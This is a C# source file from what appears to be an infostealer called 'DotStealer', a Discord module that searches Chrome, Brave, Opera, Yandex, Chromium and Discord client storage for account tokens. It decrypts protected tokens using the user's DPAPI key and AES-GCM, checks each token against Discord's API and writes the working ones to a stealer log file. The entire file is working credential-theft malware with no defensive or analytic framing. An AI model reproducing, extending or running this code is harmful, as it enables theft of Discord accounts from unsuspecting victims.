

//using Newtonsoft.Json;
//using Org.BouncyCastle.Crypto;
//using Org.BouncyCastle.Crypto.Engines;
//using Org.BouncyCastle.Crypto.Modes;
//using Org.BouncyCastle.Crypto.Parameters;
using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace DotStealer
{
    public static class Discord
    {
        public static void TokenGrabber()
        {
            List<string> stringList = new List<string>();
            string str1 = "";
            try
            {
                foreach (string token in Discord.GetTokens())
                {
                    bool flag = true;
                    foreach (string str2 in stringList)
                    {
                        if (str2 == token)
                            flag = false;
                    }
                    if (flag)
                    {
                        string check = "\"id\"";
                        try
                        {
                            WebClient webClient = new WebClient();
                            webClient.QueryString.Add("Authorization", token);
                            check = webClient.DownloadString("https://discord.com/api/v9/users/@me");
                        }
                        catch (Exception) { }
                        if (check.Contains("\"id\""))
                        {
                            str1 = str1 + token + "\n";
                            stringList.Add(token);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
            }
            try
            {
                foreach (string token in Discord.GrabTokens())
                {
                    string check = "\"id\"";
                    try
                    {
                        WebClient webClient = new WebClient();
                        webClient.QueryString.Add("Authorization", token);
                        check = webClient.DownloadString("https://discord.com/api/v9/users/@me");
                    }
                    catch (Exception) { }
                    if (check.Contains("\"id\""))
                    {
                        str1 = str1 + token + "\n";
                    }
                }
            }
            catch (Exception ex)
            {
            }
            if (str1 != "")
            {
                File.WriteAllText(config.InstallPathFixed + "\\" + config.LogFolderName + " - Log" + "\\DiscordTokens.txt", str1);
            }
        }

        public static List<string> GetTokens()
        {
            Dictionary<string, string> dictionary = new Dictionary<string, string>();
            List<string> tokens = new List<string>();
            string folderPath1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            dictionary.Add("Google Chrome", folderPath2 + "\\Google\\Chrome\\User Data\\Default");
            dictionary.Add("Google Chrome1", folderPath2 + "\\Google\\Chrome\\User Data\\Profile 1");
            dictionary.Add("Google Chrome2", folderPath2 + "\\Google\\Chrome\\User Data\\Profile 2");
            dictionary.Add("Google Chrome3", folderPath2 + "\\Google\\Chrome\\User Data\\Profile 3");
            dictionary.Add("Google Chrome4", folderPath2 + "\\Google\\Chrome\\User Data\\Profile 4");
            dictionary.Add("Google Chrome5", folderPath2 + "\\Google\\Chrome\\User Data\\Profile 5");
            dictionary.Add("Chrome SxS", folderPath2 + "\\Google\\Chrome SxS\\User Data\\Default");
            dictionary.Add("Chrome SxS1", folderPath2 + "\\Google\\Chrome SxS\\User Data\\Profile 1");
            dictionary.Add("Chrome SxS2", folderPath2 + "\\Google\\Chrome SxS\\User Data\\Profile 2");
            dictionary.Add("Chrome SxS3", folderPath2 + "\\Google\\Chrome SxS\\User Data\\Profile 3");
            dictionary.Add("Brave", folderPath2 + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
            dictionary.Add("Yandex", folderPath2 + "\\Yandex\\YandexBrowser\\User Data\\Default");
            dictionary.Add("Chromium", folderPath2 + "\\Chromium\\User Data\\Default");
            dictionary.Add("Chromium1", folderPath2 + "\\Chromium\\User Data\\Profile 1");
            dictionary.Add("Chromium2", folderPath2 + "\\Chromium\\User Data\\Profile 2");
            dictionary.Add("Chromium3", folderPath2 + "\\Chromium\\User Data\\Profile 3");
            dictionary.Add("Chromium4", folderPath2 + "\\Chromium\\User Data\\Profile 4");
            dictionary.Add("Chromium5", folderPath2 + "\\Chromium\\User Data\\Profile 5");
            dictionary.Add("Opera", folderPath1 + "\\Opera Software\\Opera GX Stable");
            dictionary.Add("OperaGX", folderPath1 + "\\Opera Software\\Opera GX");
            foreach (KeyValuePair<string, string> keyValuePair in dictionary)
            {
                string key = keyValuePair.Key;
                string path = keyValuePair.Value;
                if (Directory.Exists(path))
                {
                    try
                    {
                        foreach (string token in Discord.FindTokens(path))
                            tokens.Add(token);
                    }
                    catch (Exception ex)
                    {
                    }
                }
            }
            return tokens;
        }

        public static List<string> FindTokens(string path)
        {
            path += "\\Local Storage\\leveldb";
            List<string> tokens = new List<string>();
            foreach (string file in Directory.GetFiles(path, "*.ldb"))
            {
                foreach (Match match in Regex.Matches(File.ReadAllText(file), "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"))
                    tokens.Add(match.ToString());
            }
            return tokens;
        }

        private static List<string> GrabTokens()
        {
            List<string> str1 = new List<string>();
            List<string> stringList = new List<string>();
            Regex regex1 = new Regex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}", RegexOptions.Compiled);
            Regex regex2 = new Regex("mfa\\.[\\w-]{84}", RegexOptions.Compiled);
            Regex regex3 = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);
            try
            {
                foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\", "*.ldb", SearchOption.AllDirectories))
                {
                    string input = File.ReadAllText(new FileInfo(file).FullName);
                    Match match1 = regex1.Match(input);
                    if (match1.Success)
                        str1.Add(match1.Value);
                    Match match2 = regex2.Match(input);
                    if (match2.Success)
                        str1.Add(match2.Value);
                    Match match3 = regex3.Match(input);
                    if (match3.Success)
                    {
                        string str2 = Discord.DecryptToken(Convert.FromBase64String(match3.Value.Split(new string[1]
                        {
              "dQw4w9WgXcQ:"
                        }, StringSplitOptions.None)[1]));
                        bool flag = true;
                        foreach (string str3 in stringList)
                        {
                            if (str3 == str2)
                                flag = false;
                        }
                        if (flag)
                        {
                            str1.Add(str2);
                            stringList.Add(str2);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
            }
            try
            {
                foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordcanary\\Local Storage\\leveldb\\", "*.ldb", SearchOption.AllDirectories))
                {
                    string input = File.ReadAllText(new FileInfo(file).FullName);
                    Match match4 = regex1.Match(input);
                    if (match4.Success)
                        str1.Add(match4.Value);
                    Match match5 = regex2.Match(input);
                    if (match5.Success)
                        str1.Add(match5.Value);
                    Match match6 = regex3.Match(input);
                    if (match6.Success)
                    {
                        string str4 = Discord.DecryptToken(Convert.FromBase64String(match6.Value.Split(new string[1]
                        {
              "dQw4w9WgXcQ:"
                        }, StringSplitOptions.None)[1]));
                        bool flag = true;
                        foreach (string str5 in stringList)
                        {
                            if (str5 == str4)
                                flag = false;
                        }
                        if (flag)
                        {
                            str1.Add(match4.Value);
                            stringList.Add(str4);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
            }
            try
            {
                foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Lightcord\\Local Storage\\leveldb\\", "*.ldb", SearchOption.AllDirectories))
                {
                    string input = File.ReadAllText(new FileInfo(file).FullName);
                    Match match7 = regex1.Match(input);
                    if (match7.Success)
                        str1.Add(match7.Value);
                    Match match8 = regex2.Match(input);
                    if (match8.Success)
                        str1.Add(match8.Value);
                    Match match9 = regex3.Match(input);
                    if (match9.Success)
                    {
                        string str6 = Discord.DecryptToken(Convert.FromBase64String(match9.Value.Split(new string[1]
                        {
              "dQw4w9WgXcQ:"
                        }, StringSplitOptions.None)[1]));
                        bool flag = true;
                        foreach (string str7 in stringList)
                        {
                            if (str7 == str6)
                                flag = false;
                        }
                        if (flag)
                        {
                            str1.Add(str6);
                            stringList.Add(str6);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
            }
            try
            {
                foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordptb\\Local Storage\\leveldb\\", "*.ldb", SearchOption.AllDirectories))
                {
                    string input = File.ReadAllText(new FileInfo(file).FullName);
                    Match match10 = regex1.Match(input);
                    if (match10.Success)
                        str1.Add(match10.Value);
                    Match match11 = regex2.Match(input);
                    if (match11.Success)
                        str1.Add(match11.Value);
                    Match match12 = regex3.Match(input);
                    if (match12.Success)
                    {
                        string str8 = Discord.DecryptToken(Convert.FromBase64String(match12.Value.Split(new string[1]
                        {
              "dQw4w9WgXcQ:"
                        }, StringSplitOptions.None)[1]));
                        bool flag = true;
                        foreach (string str9 in stringList)
                        {
                            if (str9 == str8)
                                flag = false;
                        }
                        if (flag)
                        {
                            str1.Add(str8);
                            stringList.Add(str8);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
            }
            return str1;
        }

        private static byte[] DecyrptKey(string path)
        {
            dynamic DeserializedFile = JsonConvert.DeserializeObject(File.ReadAllText(path));
            return ProtectedData.Unprotect(Convert.FromBase64String((string)DeserializedFile.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        }

        private static string DecryptToken(byte[] buffer)
        {
            byte[] EncryptedData = buffer.Skip(15).ToArray();
            AeadParameters Params = new AeadParameters(new KeyParameter(DecyrptKey(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State")), 128, buffer.Skip(3).Take(12).ToArray(), null);
            GcmBlockCipher BlockCipher = new GcmBlockCipher(new AesEngine());
            BlockCipher.Init(false, Params);
            byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
            BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
            return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }
    }
}
